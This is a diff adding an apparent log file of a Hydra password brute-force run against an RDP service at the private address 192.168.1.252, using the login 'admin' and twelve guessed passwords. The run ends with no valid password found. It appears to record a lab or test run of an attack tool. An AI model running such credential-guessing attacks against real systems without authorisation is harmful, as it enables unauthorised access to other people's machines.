@@ -1,0 +1,36 @@
+Hydra RDP Brute Force (3389)
+[*] Target: 192.168.1.252:3389
+[*] User: admin
+[*] Password list: data/passwords.txt
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-17 17:30:55
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 12 login tries (l:1/p:12), ~3 tries per task
+[DATA] attacking rdp://192.168.1.252:3389/
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "dkasnf" - 1 of 12 [child 0] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "daklsdjas" - 2 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "123456" - 3 of 12 [child 2] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "11111" - 4 of 12 [child 3] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "111112" - 5 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "user1" - 6 of 12 [child 3] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "suerr" - 7 of 12 [child 0] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "userr" - 8 of 12 [child 2] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "bcacds" - 9 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "dsadgd" - 10 of 12 [child 3] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "suerr" - 10 of 12 [child 0] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "userr" - 10 of 12 [child 2] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "lmaefd" - 11 of 12 [child 2] (0/0)
+[ATTEMPT] target 192.168.1.252 - login "admin" - pass "tesflg" - 12 of 12 [child 0] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "bcacds" - 12 of 12 [child 1] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "tesflg" - 12 of 12 [child 0] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "lmaefd" - 12 of 12 [child 2] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "dsadgd" - 12 of 12 [child 3] (0/0)
+[STATUS] 12.00 tries/min, 12 tries in 00:01h, 1 to do in 00:01h, 4 active
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "lmaefd" - 12 of 12 [child 2] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "tesflg" - 12 of 12 [child 0] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "bcacds" - 12 of 12 [child 1] (0/0)
+[RE-ATTEMPT] target 192.168.1.252 - login "admin" - pass "dsadgd" - 12 of 12 [child 3] (0/0)
+0 of 1 target completed, 0 valid password found
+[INFO] Writing restore file because 2 server scans could not be completed
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-17 17:32:36
